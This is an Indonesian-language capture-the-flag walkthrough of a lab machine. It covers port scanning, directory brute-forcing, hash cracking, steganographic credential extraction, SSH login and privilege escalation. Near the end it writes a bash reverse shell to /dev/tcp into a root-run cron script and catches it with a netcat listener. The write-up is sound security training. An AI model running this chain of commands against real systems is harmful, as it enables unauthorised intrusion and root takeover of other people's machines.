Awali dengan enumerasi, disini digunakan rustscan agar lebih cepat
```
rustscan -a IP-target
...
Open 10.10.75.142:80
Open 10.10.75.142:6498
Open 10.10.75.142:65524
...
PORT      STATE SERVICE REASON
80/tcp    open  http    syn-ack
6498/tcp  open  unknown syn-ack
65524/tcp open  unknown syn-ack
```

Selanjutnya bisa gunakan nmap untuk enumerasi service
```
nmap -A -p80,6498,65524 IP-target
...
PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.16.1
|_http-server-header: nginx/1.16.1
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Welcome to nginx!
6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 30:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4 (RSA)
|   256 bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d (ECDSA)
|_  256 a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b (ED25519)
65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
|_http-server-header: Apache/2.4.43 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Apache2 Debian Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Selanjutnya coba buka 2 web yang ada `http://IP-target:80` dan `http://IP-target:65524`. Pada port 80 menggunakan `Nginx` dan 65524 menggunakan `Apache2`. Kita akan fokus ke port 80 terlebih dulu. 

Kita lakukan enumerasi dengan gobuster pada port 80
```
gobuster dir -u http://IP-target -w /usr/share/wordlists/dirb/small.txt -t 50
...
/hidden
...
```

Setelah itu karena isinya masih kosong, kita bisa lanjutkan untuk enumerasi
```
gobuster dir -u http://IP-target/hidden -w /usr/share/wordlists/dirb/small.txt -t 50
...
/whatever
```

Setelah kita buka dan lihat source pagenya, kita akan mendapat `<p hidden>ZmxhZ3tmMXJzN19mbDRnfQ==</p>`, kita dapat decode dengan base64
```
echo "ZmxhZ3tmMXJzN19mbDRnfQ==" | base64
...
flag...
```
kita dapatkan flag pertama

Selanjutnya kita dapat pergi ke port 65524 `http://IP-target:65524`. Jika kita perhatikan pada hasil nmap, kita dapat lihat bahwa `robots.txt` ada di port 65524, dan isinya seperti berikut
```
User-Agent:*
Disallow:/
Robots Not Allowed
User-Agent:a18672860d0510e5ab6699730763b250
Allow:/
This Flag Can Enter But Only This Flag No More Exceptions
```
setelah dicek dengan `hashid`, `a18672860d0510e5ab6699730763b250` ini diidentifikasikan salah satunya dengan md5, jadi kita dapat decode menggunakan tools online seperti [md5hashing.net](https://md5hashing.net/hash/md5/). Dan kita akan mendapat flag kedua.

Selanjutnya jika kita kembali ke index.html pada `http://IP-target:65524` dan melihat page source, kita akan mendapat 2 hal yang menarik
```
...
Apache 2 It Works For Me
	<p hidden>its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu</p>
...
...
...
			configuration files from their respective
			Fl4g 3 : ...
			*-available/ counterparts. These should be managed
...
```
kita mendapatkan `ObsJmP173N2X6dOrAgEAL0Vu` dan flag 3. Karena kita sudah mendapat hint "encoded with ba....", kita dapat gunakan [cyberchef.org](https://cyberchef.org/) dengan receipt `From Base..` yaitu dengan receipt `From Base[..,32-85]`, dan kita akan menemukan hidden dir untuk `http://IP-target:65524/<hasil_decode>`.

Jika kita pergi ke hidden dir tersebut, dan kita view page source, kita akan mendapat 2 hal yang menarik
```
...
<center>
<img src="binarycodepixabay.jpg" width="140px" height="140px"/>
<p>940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81</p>
</center>
```
jika kita cek `940d71..` dengan hashid, kita akan mendapat beberapa hasil identifikasi, dan salah satunya adalah **GOST R 34.11-94**. Kita dapat coba crack dengan hashcat
```
hashcat -a 0 -m 6900 "940d71.." easypeasy.txt
...
...
940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81:******
```

Selanjutnya jika kita cek file gambar **binarycodepixabay.jpg** dengan `steghide` dengan menggunakan password/passphrase dari hasil decode dengan hashcat sebelumnya.
```
steghide info binarycodepixabay.jpg                               
...
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "secrettext.txt":
    size: 278.0 Byte
...
```
kita dapat informasi bahwa terdapat file **secrettext.txt** dalam gambar tersebut. Untuk extract file tersebut, kita dapat extract dengan cara
```
steghide extract -sf binarycodepixabay.jpg -p <passphrase_hasil_hashcat>
```
jika dilihat isinya, adalah seperti berikut
```
username:boring
password:
01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
```
kita dapat decode binary code tersebut untuk password memakai [cyberchef.org](https://cyberchef.org/). Setelah itu kita bisa login ke ssh dengan menggunakan creds tersebut `boring:<hasil_decode_dengan_cyberchef>`. Kita akan mendapat flag dari user jika sudah berhasil login.

Selanjutnya kita dapat coba privesc, tapi disini kita akan upload `linpeas.sh` (download [disini](https://github.com/carlospolop/PEASS-ng/releases)) ke target mesin agar lebih cepat.
- siapkan simple pyhton server `python3 -m http.server <port>` (in case `linpeas.sh` tidak di current dir, maka copas dulu ke current dir)
- lalu wget di mesin target `wget http://IP-target:<port>/linpeas.sh`
- ubah permission file `chmod +x linpeas.sh`
- run `./linpeas.sh`
hasilnya
```
╔══════════╣ Cron jobs
...
SHELL=/bin/sh                                                                                                                        
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin                                                                    
                                                                                                                                     
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly                                                                  
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )                                  
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )                                 
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )                                
* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh
...
...
╔══════════╣ Web files?(output limit)                                                                                                
/var/www/:                                                                                                                           
total 16K                                                                                                                            
drwxr-xr-x  3 root   root   4.0K Jun 15  2020 .                                                                                      
drwxr-xr-x 14 root   root   4.0K Jun 13  2020 ..                                                                                     
drwxr-xr-x  4 root   root   4.0K Jun 15  2020 html                                                                                   
-rwxr-xr-x  1 boring boring   33 Jun 14  2020 .mysecretcronjob.sh
...
```
dapat kita lihat bahwa akan ada cronjob `cd /var/www/ && sudo bash .mysecretcronjob.sh` yang mana akan run file tersebut sebagai root. Selain itu file **.mysecretcronjob.sh** editable oleh kita sebagai "boring". Kita dapat edit file tersebut dengan `nano .mysecretcronjob.sh` dan kita tambahkan line revshell
```
nano .mysecretcronjob.sh
...                                                                                                                                     
#!/bin/bash                                                                                                                          
# i will run as root                                                                                                                 
bash -i >& /dev/tcp/IP-local/<port> 0>&1
...
```
dengan mengubah `IP-local` dengan IP kita, dan `<port>` dengan port pilihan. Setelah itu kita bisa siapkan listener dengan
```
rlwrap ncat -lvnp <port>
```
setelah itu tunggu beberapa saat dan kita akan mendapat shell sebagai root
```
root@kral4-PC:~# whoami
whoami
root
root@kral4-PC:~# 
```
dan kita bisa bebas mencari flag terakhir, yang pastinya berada di `/root`